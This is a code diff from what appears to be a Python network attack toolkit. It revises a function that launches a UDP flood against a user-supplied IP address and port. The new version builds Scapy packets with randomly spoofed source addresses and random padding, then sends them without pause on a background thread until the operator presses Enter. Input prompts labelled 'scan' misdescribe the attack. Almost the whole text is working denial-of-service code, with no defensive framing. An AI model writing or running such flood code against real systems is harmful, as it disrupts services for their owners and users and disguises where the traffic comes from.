@@ -220,20 +220,40 @@ def perform_icmp_flood_attack(ip_addr=None):
 
 
 #(13) Code to perform udp flood attack
-def perform_udp_flood_attack(ip_addr=None, port_range=None):
+def perform_udp_flood_attack(ip_addr=None, port=None):
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to scan: ")
 
     if not port:
         # Get input from the user
-        port = input("Enter the port range to scan (e.g. 1-1000): ")
+        port = input("Enter the port to attack: ")
 
     packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port)) / ("X" * RandByte())
-    while true:
-        send(packet)
 
-    return "UDP flood attack performed on " + ip_addr + " from " + port_range
+    # Create a flag to indicate whether to stop the attack
+    stop_flag = threading.Event()
+
+    def send_packet():
+        while not stop_flag.is_set():
+            send(packet)
+
+    # Create a separate thread to perform the attack
+    attack_thread = threading.Thread(target=send_packet)
+
+    # Start the attack thread
+    attack_thread.start()
+
+    # Wait for user input to stop the attack
+    input("Press Enter to stop the attack...")
+
+    # Set the stop flag to stop the attack
+    stop_flag.set()
+
+    # Wait for the attack thread to finish
+    attack_thread.join()
+
+    return "UDP flood attack performed on " + ip_addr + " from " + port
 
 
 #(14) Code to perform drop communication
